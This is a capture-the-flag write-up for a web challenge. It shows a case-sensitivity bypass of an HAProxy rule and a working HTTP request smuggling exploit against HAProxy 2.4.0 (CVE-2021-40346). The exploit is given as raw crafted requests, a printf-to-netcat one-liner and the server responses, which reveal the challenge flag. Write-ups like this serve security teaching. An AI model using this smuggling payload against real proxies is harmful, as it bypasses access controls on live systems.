---
description: HAProxy HTTP Request Smuggling
---

# StrUggLe

> Welcome to Web! I struggle everyday I face a new website, can you access /flag endpoint ?
>
> Link: http://128.199.3.34:1235
>
> **Author:** Kahla

### Unintended Solution

The HAProxy configuration to protect the `/flag` endpoint was case sensitive. Therefore, the following would be sufficient to bypass the validation.

```http
GET /FLAG HTTP/1.1
Host: 128.199.3.34:1235

```

```http
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 43
etag: W/"2b-aWQ+/21qg4d1e3yOxiZcpTrSBxw"
date: Fri, 13 May 2022 09:34:06 GMT
x-server: HaProxy-2.4.0

Securinets{W3lC0me_T0_FinAlS_4nD_SmUUgLinG}
```

### Intended Solution

From the server response headers, we know that HAProxy version 2.4.0 is used in front of an Express application. This version is vulnerable to a [HTTP request smuggling vulnerability](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/).

Basically, an integer overflow leads to `Content-Length0aaa...aaa:` being forwarded to the backend as `Content-Length: 0`, while a second duplicate `Content-Length` header is used by HAProxy to determine the length of the request body.

```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 26

GET /flag HTTP/1.1
DUMMY:GET / HTTP/1.1
Host: 128.199.3.34:1235

```

In the above example, HAProxy considers the following to be the first request:

```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length: 26

GET /flag HTTP/1.1
DUMMY:
```

while the second request is the following:

```http
GET / HTTP/1.1
Host: 128.199.3.34:1235

```

However, when forwarded to the backend, this becomes:

```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length: 0

GET /flag HTTP/1.1
DUMMY:GET / HTTP/1.1
Host: 128.199.3.34:1235

```

Therefore, the response for the second request will correspond to `/flag` instead of `/`.

Due to the way the pipelining works, we have to add some artificial delays when sending the consecutive requests.

```bash
$ (printf "POST / HTTP/1.1\r\n"\
"Host: 128.199.3.34:1235\r\n"\
"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\n"\
"Content-Length: 26\r\n\r\n"; sleep 1;
printf "GET /flag HTTP/1.1\r\n"\
"DUMMY:"; sleep 1; printf "GET /test HTTP/1.1\r\n"\
"Host: 128.199.3.34:1235\r\n\r\n") | nc 128.199.3.34 1235
```

```http
HTTP/1.1 404 Not Found
x-powered-by: Express
content-security-policy: default-src 'none'
x-content-type-options: nosniff
content-type: text/html; charset=utf-8
content-length: 140
date: Fri, 13 May 2022 09:41:24 GMT
x-server: HaProxy-2.4.0

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /</pre>
</body>
</html>
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 43
etag: W/"2b-aWQ+/21qg4d1e3yOxiZcpTrSBxw"
date: Fri, 13 May 2022 09:41:26 GMT
x-server: HaProxy-2.4.0

Securinets{W3lC0me_T0_FinAlS_4nD_SmUUgLinG}
```
